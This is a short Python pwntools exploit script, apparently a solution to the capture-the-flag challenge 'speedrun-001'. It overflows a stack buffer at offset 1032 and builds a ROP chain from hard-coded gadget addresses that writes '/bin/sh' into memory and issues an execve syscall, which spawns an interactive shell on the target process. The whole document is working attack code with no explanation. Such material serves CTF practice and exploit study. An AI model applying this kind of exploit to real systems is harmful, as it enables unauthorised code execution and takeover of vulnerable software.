#!/usr/bin/env python3

import pwn as p

def b(i):
    return i.to_bytes(8,"little")

io = p.process("./speedrun-001")

offset = 1032

pop_rax = 0x0000000000415664
pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004101f3
pop_rdx = 0x00000000004498b5

syscall = 0x000000000040129c

payload = b"A" * offset

payload += b(pop_rdx)
payload += b"/bin/sh\x00"
payload += b(pop_rax)
payload += b(0x6b6001)
payload += b(0x48d251)

payload += b(pop_rax)
payload += b(0x3b)
payload += b(pop_rdi)
payload += b(0x6b6001)
payload += b(pop_rsi)
payload += b(0x0)
payload += b(pop_rdx)
payload += b(0x0)

payload += b(syscall)

io.sendlineafter(b"Any last words?\n", payload)
io.interactive()

